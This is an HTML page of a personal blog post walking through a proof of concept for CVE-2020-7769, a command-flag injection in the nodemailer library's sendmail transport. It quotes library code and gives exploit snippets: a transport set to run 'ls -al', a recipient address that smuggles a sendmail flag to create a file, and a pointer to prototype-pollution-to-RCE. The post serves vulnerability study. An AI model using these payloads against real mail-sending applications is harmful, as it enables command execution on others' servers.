<!doctype html><html lang=en dir=auto data-theme=auto><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>[POC] CVE-2020-7769 - Command Injection in nodemailer | ancorn_</title><meta name=keywords content><meta name=description content="Introduction
Command Injection in nodemailer
Someday, i read some product code and found out that application using nodemailer to send email. After spending some second to audit package-lock file, i saw it had this CVE.
But i read that details and their POC, i still not understand what they want to deliver.
Found their commit to fix their bug and already know where the bug from
https://github.com/nodemailer/nodemailer/commit/ba31c64c910d884579875c52d57ac45acc47aa54
It comes from send function, with arbitrary command flag injection in sendmail transport.
"><meta name=author content="ancorn_"><link rel=canonical href=http://localhost:1313/posts/poc-cve-2020-7769---command-injection-in-nodemailer/><meta name=google-site-verification content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.a29c24210eb31d9ce56f669c66a35c9c51b17376b7764e336a49af7dec914cf0.css integrity="sha256-opwkIQ6zHZzlb2acZqNcnFGxc3a3dk4zakmvfeyRTPA=" rel="preload stylesheet" as=style><link rel=icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=http://localhost:1313/posts/poc-cve-2020-7769---command-injection-in-nodemailer/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51);color-scheme:dark}.list{background:var(--theme)}.toc{background:var(--entry)}}@media(prefers-color-scheme:light){.list::-webkit-scrollbar-thumb{border-color:var(--code-bg)}}</style></noscript><script>localStorage.getItem("pref-theme")==="dark"?document.querySelector("html").dataset.theme="dark":localStorage.getItem("pref-theme")==="light"?document.querySelector("html").dataset.theme="light":window.matchMedia("(prefers-color-scheme: dark)").matches?document.querySelector("html").dataset.theme="dark":document.querySelector("html").dataset.theme="light"</script><meta property="og:url" content="http://localhost:1313/posts/poc-cve-2020-7769---command-injection-in-nodemailer/"><meta property="og:site_name" content="ancorn_"><meta property="og:title" content="[POC] CVE-2020-7769 - Command Injection in nodemailer"><meta property="og:description" content="Introduction Command Injection in nodemailer
Someday, i read some product code and found out that application using nodemailer to send email. After spending some second to audit package-lock file, i saw it had this CVE.
But i read that details and their POC, i still not understand what they want to deliver.
Found their commit to fix their bug and already know where the bug from https://github.com/nodemailer/nodemailer/commit/ba31c64c910d884579875c52d57ac45acc47aa54
It comes from send function, with arbitrary command flag injection in sendmail transport. "><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-09-03T21:24:25+07:00"><meta property="article:modified_time" content="2023-09-03T21:24:25+07:00"><meta property="og:image" content="https://pbs.twimg.com/profile_images/1634910718846963717/RJTIDn4s_400x400.jpg"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://pbs.twimg.com/profile_images/1634910718846963717/RJTIDn4s_400x400.jpg"><meta name=twitter:title content="[POC] CVE-2020-7769 - Command Injection in nodemailer"><meta name=twitter:description content="Introduction
Command Injection in nodemailer
Someday, i read some product code and found out that application using nodemailer to send email. After spending some second to audit package-lock file, i saw it had this CVE.
But i read that details and their POC, i still not understand what they want to deliver.
Found their commit to fix their bug and already know where the bug from
https://github.com/nodemailer/nodemailer/commit/ba31c64c910d884579875c52d57ac45acc47aa54
It comes from send function, with arbitrary command flag injection in sendmail transport.
"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"http://localhost:1313/posts/"},{"@type":"ListItem","position":2,"name":"[POC] CVE-2020-7769 - Command Injection in nodemailer","item":"http://localhost:1313/posts/poc-cve-2020-7769---command-injection-in-nodemailer/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"[POC] CVE-2020-7769 - Command Injection in nodemailer","name":"[POC] CVE-2020-7769 - Command Injection in nodemailer","description":"Introduction Command Injection in nodemailer\nSomeday, i read some product code and found out that application using nodemailer to send email. After spending some second to audit package-lock file, i saw it had this CVE.\nBut i read that details and their POC, i still not understand what they want to deliver.\nFound their commit to fix their bug and already know where the bug from https://github.com/nodemailer/nodemailer/commit/ba31c64c910d884579875c52d57ac45acc47aa54\nIt comes from send function, with arbitrary command flag injection in sendmail transport. ","keywords":[],"articleBody":"Introduction Command Injection in nodemailer\nSomeday, i read some product code and found out that application using nodemailer to send email. After spending some second to audit package-lock file, i saw it had this CVE.\nBut i read that details and their POC, i still not understand what they want to deliver.\nFound their commit to fix their bug and already know where the bug from https://github.com/nodemailer/nodemailer/commit/ba31c64c910d884579875c52d57ac45acc47aa54\nIt comes from send function, with arbitrary command flag injection in sendmail transport. POC I found they have their test case that\nclient.send( { data: {}, message: new MockBuilder( { from: 'test@valid.sender', to: '-d0.1a@example.com' //this line will print sendmail detail }, 'message\\r\\nline 2' ) }, function (err, data) { } ); Yeah it just work on Unix-base OS and i test it with my Windows laptop :)))))\nBut I dig deeper and find some good things\nconstructor(options) { options = options || {}; // use a reference to spawn for mocking purposes this._spawn = spawn; this.options = options || {}; this.name = 'Sendmail'; this.version = packageData.version; this.path = 'sendmail'; this.args = false; this.winbreak = false; this.logger = shared.getLogger(this.options, { component: this.options.component || 'sendmail' }); if (options) { if (typeof options === 'string') { this.path = options; } else if (typeof options === 'object') { if (options.path) { this.path = options.path; } if (Array.isArray(options.args)) { this.args = options.args; } this.winbreak = ['win', 'windows', 'dos', '\\r\\n'].includes((options.newline || '').toString().toLowerCase()); } } } This is their constructor and we can find good things that we can control path, args variable by passing these property in options\nSo i craft this one to exploit\nlet client = new SendmailTransport({ host: \"smtp.ethereal.email\", port: 587, secure: false, auth: { user: \"rudolph53@ethereal.email\", //fake email pass: \"sR3KWXG8p3DhUrwant\", //fake pass }, path: 'ls', args: ['-al'] }); client.send({ data: {}, message: new MockBuilder({ from: 'rudolph53@ethereal.email', to: '/' //this is directory }, 'message\\r\\nline 2') }, (err, info) =\u003e { }) It will list all file in directory /\nBut i see that almost developer don’t use send function to send email, they use sendMail instead\nThen i have to read code again and i found we can exploit not just from send function.\nIn this code in library\nmodule.exports.createTransport = function (transporter, defaults) { let urlConfig; let options; let mailer; if ( // provided transporter is a configuration object, not transporter plugin (typeof transporter === 'object' \u0026\u0026 typeof transporter.send !== 'function') || // provided transporter looks like a connection url (typeof transporter === 'string' \u0026\u0026 /^(smtps?|direct):/i.test(transporter)) ) { if ((urlConfig = typeof transporter === 'string' ? transporter : transporter.url)) { // parse a configuration URL into configuration options options = shared.parseConnectionUrl(urlConfig); } else { options = transporter; } if (options.pool) { transporter = new SMTPPool(options); } else if (options.sendmail) { transporter = new SendmailTransport(options); } else if (options.streamTransport) { transporter = new StreamTransport(options); } else if (options.jsonTransport) { transporter = new JSONTransport(options); } else if (options.SES) { transporter = new SESTransport(options); } else { transporter = new SMTPTransport(options); } } mailer = new Mailer(transporter, options, defaults); return mailer; }; It will bind new SendmailTransport if in options contain property sendmail\nSo i will define sendmail property without falsy value like this one, and tada we can inject command flag\nconst transport = nodeMailer.createTransport({ host: \"smtp.ethereal.email\", port: 587, secure: false, auth: { user: \"rudolph53@ethereal.email\", pass: \"sR3KWXG8p3DhUrwant\", }, sendmail: {} //define without falsy value }) transport.sendMail({ from: 'rudolph53@ethereal.email', to: '-Dabcas.txt@ethereal.email', //it will create file subject: '123', text: 'sibaaa' }) But if we can find in that application have vulnerable with Prototype Pollution, you can RCE it with this one https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce#spawn-exploitation\nBecause it use spawn of child_process that i show before\nAnd that application will f* up :)))))))\nSo, i show you 2 ways to exploit with that CVE, kkkk\n","wordCount":"622","inLanguage":"en","image":"https://pbs.twimg.com/profile_images/1634910718846963717/RJTIDn4s_400x400.jpg","datePublished":"2023-09-03T21:24:25+07:00","dateModified":"2023-09-03T21:24:25+07:00","author":{"@type":"Person","name":"ancorn_"},"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:1313/posts/poc-cve-2020-7769---command-injection-in-nodemailer/"},"publisher":{"@type":"Organization","name":"ancorn_","logo":{"@type":"ImageObject","url":"http://localhost:1313/%3Clink%20/%20abs%20url%3E"}}}</script></head><body id=top><header class=header><nav class=nav><div class=logo><a href=http://localhost:1313/ accesskey=h title="Home (Alt + H)"><img src=http://localhost:1313/apple-touch-icon.png alt aria-label=logo height=35>Home</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=http://localhost:1313/posts/ title=Posts><span>Posts</span></a></li><li><a href=http://localhost:1313/about title=About><span>About</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=http://localhost:1313/>Home</a>&nbsp;»&nbsp;<a href=http://localhost:1313/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">[POC] CVE-2020-7769 - Command Injection in nodemailer</h1><div class=post-meta><span title='2023-09-03 21:24:25 +0700 +07'>September 3, 2023</span>&nbsp;·&nbsp;<span>3 min</span>&nbsp;·&nbsp;<span>622 words</span>&nbsp;·&nbsp;<span>ancorn_</span></div></header><div class=post-content><h2 id=introduction>Introduction<a hidden class=anchor aria-hidden=true href=#introduction>#</a></h2><p><a href=https://security.snyk.io/vuln/SNYK-JS-NODEMAILER-1038834>Command Injection in nodemailer</a></p><p>Someday, i read some product code and found out that application using nodemailer to send email. After spending some second to audit <strong>package-lock</strong> file, i saw it had this CVE.</p><p>But i read that details and their POC, i still not understand what they want to deliver.</p><p>Found their commit to fix their bug and already know where the bug from
<a href=https://github.com/nodemailer/nodemailer/commit/ba31c64c910d884579875c52d57ac45acc47aa54>https://github.com/nodemailer/nodemailer/commit/ba31c64c910d884579875c52d57ac45acc47aa54</a></p><p>It comes from <strong>send</strong> function, with arbitrary command flag injection in <strong>sendmail</strong> transport.
<img loading=lazy src=/CVE-2020-7769/1.png></p><h2 id=poc>POC<a hidden class=anchor aria-hidden=true href=#poc>#</a></h2><p>I found they have their test case that</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=nx>client</span><span class=p>.</span><span class=nx>send</span><span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nx>data</span><span class=o>:</span> <span class=p>{},</span>
</span></span><span class=line><span class=cl>                <span class=nx>message</span><span class=o>:</span> <span class=k>new</span> <span class=nx>MockBuilder</span><span class=p>(</span>
</span></span><span class=line><span class=cl>                    <span class=p>{</span>
</span></span><span class=line><span class=cl>                        <span class=nx>from</span><span class=o>:</span> <span class=s1>&#39;test@valid.sender&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                        <span class=nx>to</span><span class=o>:</span> <span class=s1>&#39;-d0.1a@example.com&#39;</span> <span class=c1>//this line will print sendmail detail
</span></span></span><span class=line><span class=cl>                    <span class=p>},</span>
</span></span><span class=line><span class=cl>                    <span class=s1>&#39;message\r\nline 2&#39;</span>
</span></span><span class=line><span class=cl>                <span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=p>},</span>
</span></span><span class=line><span class=cl>            <span class=kd>function</span> <span class=p>(</span><span class=nx>err</span><span class=p>,</span> <span class=nx>data</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>);</span>
</span></span></code></pre></div><p>Yeah it just work on <strong>Unix-base OS</strong> and i test it with my Windows laptop :)))))</p><p>But I dig deeper and find some good things</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=nx>constructor</span><span class=p>(</span><span class=nx>options</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>options</span> <span class=o>=</span> <span class=nx>options</span> <span class=o>||</span> <span class=p>{};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1>// use a reference to spawn for mocking purposes
</span></span></span><span class=line><span class=cl>        <span class=k>this</span><span class=p>.</span><span class=nx>_spawn</span> <span class=o>=</span> <span class=nx>spawn</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>this</span><span class=p>.</span><span class=nx>options</span> <span class=o>=</span> <span class=nx>options</span> <span class=o>||</span> <span class=p>{};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>this</span><span class=p>.</span><span class=nx>name</span> <span class=o>=</span> <span class=s1>&#39;Sendmail&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>this</span><span class=p>.</span><span class=nx>version</span> <span class=o>=</span> <span class=nx>packageData</span><span class=p>.</span><span class=nx>version</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>this</span><span class=p>.</span><span class=nx>path</span> <span class=o>=</span> <span class=s1>&#39;sendmail&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>this</span><span class=p>.</span><span class=nx>args</span> <span class=o>=</span> <span class=kc>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>this</span><span class=p>.</span><span class=nx>winbreak</span> <span class=o>=</span> <span class=kc>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>this</span><span class=p>.</span><span class=nx>logger</span> <span class=o>=</span> <span class=nx>shared</span><span class=p>.</span><span class=nx>getLogger</span><span class=p>(</span><span class=k>this</span><span class=p>.</span><span class=nx>options</span><span class=p>,</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>component</span><span class=o>:</span> <span class=k>this</span><span class=p>.</span><span class=nx>options</span><span class=p>.</span><span class=nx>component</span> <span class=o>||</span> <span class=s1>&#39;sendmail&#39;</span>
</span></span><span class=line><span class=cl>        <span class=p>});</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nx>options</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=k>typeof</span> <span class=nx>options</span> <span class=o>===</span> <span class=s1>&#39;string&#39;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=k>this</span><span class=p>.</span><span class=nx>path</span> <span class=o>=</span> <span class=nx>options</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span> <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=k>typeof</span> <span class=nx>options</span> <span class=o>===</span> <span class=s1>&#39;object&#39;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=p>(</span><span class=nx>options</span><span class=p>.</span><span class=nx>path</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                    <span class=k>this</span><span class=p>.</span><span class=nx>path</span> <span class=o>=</span> <span class=nx>options</span><span class=p>.</span><span class=nx>path</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=p>(</span><span class=nb>Array</span><span class=p>.</span><span class=nx>isArray</span><span class=p>(</span><span class=nx>options</span><span class=p>.</span><span class=nx>args</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                    <span class=k>this</span><span class=p>.</span><span class=nx>args</span> <span class=o>=</span> <span class=nx>options</span><span class=p>.</span><span class=nx>args</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span>
</span></span><span class=line><span class=cl>                <span class=k>this</span><span class=p>.</span><span class=nx>winbreak</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;win&#39;</span><span class=p>,</span> <span class=s1>&#39;windows&#39;</span><span class=p>,</span> <span class=s1>&#39;dos&#39;</span><span class=p>,</span> <span class=s1>&#39;\r\n&#39;</span><span class=p>].</span><span class=nx>includes</span><span class=p>((</span><span class=nx>options</span><span class=p>.</span><span class=nx>newline</span> <span class=o>||</span> <span class=s1>&#39;&#39;</span><span class=p>).</span><span class=nx>toString</span><span class=p>().</span><span class=nx>toLowerCase</span><span class=p>());</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span></code></pre></div><p>This is their constructor and we can find good things that we can control
<strong>path, args</strong> variable by passing these property in <strong>options</strong></p><p>So i craft this one to exploit</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=kd>let</span> <span class=nx>client</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>SendmailTransport</span><span class=p>({</span>
</span></span><span class=line><span class=cl>        <span class=nx>host</span><span class=o>:</span> <span class=s2>&#34;smtp.ethereal.email&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=nx>port</span><span class=o>:</span> <span class=mi>587</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=nx>secure</span><span class=o>:</span> <span class=kc>false</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=nx>auth</span><span class=o>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>user</span><span class=o>:</span> <span class=s2>&#34;rudolph53@ethereal.email&#34;</span><span class=p>,</span> <span class=c1>//fake email
</span></span></span><span class=line><span class=cl>            <span class=nx>pass</span><span class=o>:</span> <span class=s2>&#34;sR3KWXG8p3DhUrwant&#34;</span><span class=p>,</span> <span class=c1>//fake pass
</span></span></span><span class=line><span class=cl>        <span class=p>},</span>
</span></span><span class=line><span class=cl>        <span class=nx>path</span><span class=o>:</span> <span class=s1>&#39;ls&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=nx>args</span><span class=o>:</span> <span class=p>[</span><span class=s1>&#39;-al&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=p>});</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nx>client</span><span class=p>.</span><span class=nx>send</span><span class=p>({</span>
</span></span><span class=line><span class=cl>        <span class=nx>data</span><span class=o>:</span> <span class=p>{},</span>
</span></span><span class=line><span class=cl>        <span class=nx>message</span><span class=o>:</span> <span class=k>new</span> <span class=nx>MockBuilder</span><span class=p>({</span>
</span></span><span class=line><span class=cl>            <span class=nx>from</span><span class=o>:</span> <span class=s1>&#39;rudolph53@ethereal.email&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=nx>to</span><span class=o>:</span> <span class=s1>&#39;/&#39;</span> <span class=c1>//this is directory
</span></span></span><span class=line><span class=cl>        <span class=p>},</span> <span class=s1>&#39;message\r\nline 2&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>},</span> <span class=p>(</span><span class=nx>err</span><span class=p>,</span> <span class=nx>info</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=p>})</span>
</span></span></code></pre></div><p>It will list all file in directory /</p><p>But i see that almost developer don’t use send function to send email, they use <strong>sendMail</strong> instead</p><p>Then i have to read code again and i found we can exploit not just from <strong>send</strong> function.</p><p>In this code in library</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=nx>module</span><span class=p>.</span><span class=nx>exports</span><span class=p>.</span><span class=nx>createTransport</span> <span class=o>=</span> <span class=kd>function</span> <span class=p>(</span><span class=nx>transporter</span><span class=p>,</span> <span class=nx>defaults</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kd>let</span> <span class=nx>urlConfig</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kd>let</span> <span class=nx>options</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kd>let</span> <span class=nx>mailer</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=c1>// provided transporter is a configuration object, not transporter plugin
</span></span></span><span class=line><span class=cl>        <span class=p>(</span><span class=k>typeof</span> <span class=nx>transporter</span> <span class=o>===</span> <span class=s1>&#39;object&#39;</span> <span class=o>&amp;&amp;</span> <span class=k>typeof</span> <span class=nx>transporter</span><span class=p>.</span><span class=nx>send</span> <span class=o>!==</span> <span class=s1>&#39;function&#39;</span><span class=p>)</span> <span class=o>||</span>
</span></span><span class=line><span class=cl>        <span class=c1>// provided transporter looks like a connection url
</span></span></span><span class=line><span class=cl>        <span class=p>(</span><span class=k>typeof</span> <span class=nx>transporter</span> <span class=o>===</span> <span class=s1>&#39;string&#39;</span> <span class=o>&amp;&amp;</span> <span class=sr>/^(smtps?|direct):/i</span><span class=p>.</span><span class=nx>test</span><span class=p>(</span><span class=nx>transporter</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>((</span><span class=nx>urlConfig</span> <span class=o>=</span> <span class=k>typeof</span> <span class=nx>transporter</span> <span class=o>===</span> <span class=s1>&#39;string&#39;</span> <span class=o>?</span> <span class=nx>transporter</span> <span class=o>:</span> <span class=nx>transporter</span><span class=p>.</span><span class=nx>url</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=c1>// parse a configuration URL into configuration options
</span></span></span><span class=line><span class=cl>            <span class=nx>options</span> <span class=o>=</span> <span class=nx>shared</span><span class=p>.</span><span class=nx>parseConnectionUrl</span><span class=p>(</span><span class=nx>urlConfig</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>options</span> <span class=o>=</span> <span class=nx>transporter</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nx>options</span><span class=p>.</span><span class=nx>pool</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>transporter</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>SMTPPool</span><span class=p>(</span><span class=nx>options</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=nx>options</span><span class=p>.</span><span class=nx>sendmail</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>transporter</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>SendmailTransport</span><span class=p>(</span><span class=nx>options</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=nx>options</span><span class=p>.</span><span class=nx>streamTransport</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>transporter</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>StreamTransport</span><span class=p>(</span><span class=nx>options</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=nx>options</span><span class=p>.</span><span class=nx>jsonTransport</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>transporter</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>JSONTransport</span><span class=p>(</span><span class=nx>options</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=nx>options</span><span class=p>.</span><span class=nx>SES</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>transporter</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>SESTransport</span><span class=p>(</span><span class=nx>options</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>transporter</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>SMTPTransport</span><span class=p>(</span><span class=nx>options</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nx>mailer</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Mailer</span><span class=p>(</span><span class=nx>transporter</span><span class=p>,</span> <span class=nx>options</span><span class=p>,</span> <span class=nx>defaults</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>mailer</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span></code></pre></div><p>It will bind <strong>new SendmailTransport</strong> if in options contain property <strong>sendmail</strong></p><p>So i will define <strong>sendmail</strong> property without falsy value like this one, and tada we can inject command flag</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=kr>const</span> <span class=nx>transport</span> <span class=o>=</span> <span class=nx>nodeMailer</span><span class=p>.</span><span class=nx>createTransport</span><span class=p>({</span>
</span></span><span class=line><span class=cl>        <span class=nx>host</span><span class=o>:</span> <span class=s2>&#34;smtp.ethereal.email&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=nx>port</span><span class=o>:</span> <span class=mi>587</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=nx>secure</span><span class=o>:</span> <span class=kc>false</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=nx>auth</span><span class=o>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>user</span><span class=o>:</span> <span class=s2>&#34;rudolph53@ethereal.email&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=nx>pass</span><span class=o>:</span> <span class=s2>&#34;sR3KWXG8p3DhUrwant&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=p>},</span>
</span></span><span class=line><span class=cl>        <span class=nx>sendmail</span><span class=o>:</span> <span class=p>{}</span> <span class=c1>//define without falsy value
</span></span></span><span class=line><span class=cl>    <span class=p>})</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nx>transport</span><span class=p>.</span><span class=nx>sendMail</span><span class=p>({</span>
</span></span><span class=line><span class=cl>        <span class=nx>from</span><span class=o>:</span> <span class=s1>&#39;rudolph53@ethereal.email&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=nx>to</span><span class=o>:</span> <span class=s1>&#39;-Dabcas.txt@ethereal.email&#39;</span><span class=p>,</span> <span class=c1>//it will create file
</span></span></span><span class=line><span class=cl>        <span class=nx>subject</span><span class=o>:</span> <span class=s1>&#39;123&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=nx>text</span><span class=o>:</span> <span class=s1>&#39;sibaaa&#39;</span>
</span></span><span class=line><span class=cl>    <span class=p>})</span>
</span></span></code></pre></div><p>But if we can find in that application have vulnerable with Prototype Pollution, you can RCE it with this one
